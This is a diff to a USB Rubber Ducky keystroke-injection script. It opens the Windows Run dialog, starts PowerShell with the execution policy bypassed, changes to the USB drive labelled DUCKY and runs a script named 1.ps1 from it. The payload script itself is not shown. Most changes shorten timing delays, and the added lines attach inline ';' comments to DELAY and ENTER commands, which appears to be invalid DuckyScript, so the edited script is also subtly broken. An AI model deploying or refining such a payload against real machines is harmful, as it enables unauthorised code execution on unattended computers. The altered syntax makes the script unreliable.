@@ -1,38 +1,40 @@
 ATTACKMODE HID STORAGE
-DEFAULTDELAY 200
+
+REM Slower start to ensure Run window opens properly
+DELAY 1000  ; Ensure Run window appears
 
 REM Open PowerShell with script execution enabled
 GUI r
-DELAY 500
+DELAY 500  ; Decrease delay after opening Run
 STRING powershell -ExecutionPolicy Bypass
-DELAY 1000
-ENTER
+ENTER  ; Press Enter immediately to open PowerShell faster
 
-REM Wait for PowerShell to open fully
-DELAY 2000
+REM Wait for PowerShell to open completely
+DELAY 500  ; Shortened delay once PowerShell is open
 
-REM Get USB drive letter and change to the drive (assuming drive label is DUCKY)
-DELAY 300
+REM Set drive label and get USB drive letter (faster execution)
+DELAY 100  ; Faster execution once inside PowerShell
 STRING $targetLabel = "DUCKY"
 ENTER
-DELAY 300
+DELAY 100
 STRING $volume = Get-Volume | Where-Object { $_.FileSystemLabel -eq $targetLabel }
 ENTER
-DELAY 300
+DELAY 100
 STRING $driveLetter = $volume.DriveLetter + ":"
 ENTER
-DELAY 300
+DELAY 100
 STRING cd $driveLetter
 ENTER
 
 REM Execute PowerShell script (ensure 1.ps1 exists on the USB drive)
-DELAY 500
+DELAY 200  ; Reduced delay before executing the PowerShell script
 STRING .\1.ps1
 ENTER
 
 REM Wait for the script to finish executing
-DELAY 5000
+DELAY 1000  ; Reduced wait time for the script to complete
 
 REM Close PowerShell
 DELAY 500
-ALT F4
+STRING exit
+ENTER
